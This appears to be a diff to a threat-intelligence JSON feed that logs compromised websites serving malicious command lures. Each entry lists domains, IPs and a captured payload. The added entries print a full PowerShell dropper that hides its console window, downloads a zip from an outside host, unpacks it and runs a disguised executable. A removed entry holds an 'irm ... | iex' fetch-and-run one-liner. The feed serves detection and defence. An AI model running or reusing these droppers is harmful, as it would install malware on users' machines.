@@ -1,5 +1,43 @@
 [
   {
+    "UrlDomain": "arushataxiservice.com",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "40.160.21.52"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwr1e0hk28uo0omlsv4p1gom",
+    "ScannedAt": "2026-11-21T23:26:04.830000+00:00"
+  },
+  {
+    "UrlDomain": "patcore.net",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "162.0.235.198"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwr1ddfx28u30oml4qgsvp8u",
+    "ScannedAt": "2026-11-21T23:25:34.994000+00:00"
+  },
+  {
     "UrlDomain": "lotus-property.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -3223,35 +3261,5 @@
     ],
     "ReportId": "cmwms5p8k1uev0omlqz8p9obh",
     "ScannedAt": "2026-11-18T23:56:35.729000+00:00"
-  },
-  {
-    "UrlDomain": "sailingservant.org",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "158.69.54.116"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/336728d213008c22",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&amp;_v=29917395",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://browse-cloud.codes/api.php?s=d337fe5678dbf1893653249a44964fe325f0428d2f4be1ae&_v=29917395",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/336728d213008c22'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/336728d213008c22"
-    ],
-    "ReportId": "cmwmqp0cv1uc20oml7a6uzgnn",
-    "ScannedAt": "2026-11-18T23:15:37.353000+00:00"
   }
 ]
